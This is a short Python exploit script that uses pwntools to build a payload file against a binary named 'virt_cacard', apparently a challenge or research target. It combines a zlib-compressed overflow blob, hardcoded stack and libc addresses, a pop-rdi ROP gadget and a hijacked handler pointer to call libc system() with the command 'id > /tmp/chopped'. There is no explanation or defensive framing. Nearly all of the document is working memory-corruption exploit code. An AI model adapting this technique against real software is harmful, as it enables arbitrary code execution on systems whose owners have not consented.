from pwn import * 
import zlib


handler_addr = 0x10000FCDD+1
stack_addr = 0x00007fff5fbfefa0
pop_rdi_gadget = 0x0000000100002ff4 #: pop rdi ; leave ; ret

libc_base = 0x00007fff8acb2000
system_off = 0x80c8e
system_off = 0x66fed

cmd = "id > /tmp/chopped \0"

pl = fit({
    0: p8(1),
    1: zlib.compress(b"\x41"*31337, 9),

    0x1170+800: cmd,

    0x12e0: p64(stack_addr),     # for leave of hijacked handler
    0x12e8: p64(handler_addr),

    0x1300: p64(stack_addr+0x18), # for leave of pop_rdi_gagdget
    0x1308: p64(pop_rdi_gadget),  
    0x1310: p64(stack_addr+400), # will point to cmd

    0x1320: p64(libc_base + system_off)
},
length = 0x64*60
)


with open("payload.bin", 'wb') as f:
    f.write(pl)

p = process('./virt_cacard')
p.interactive()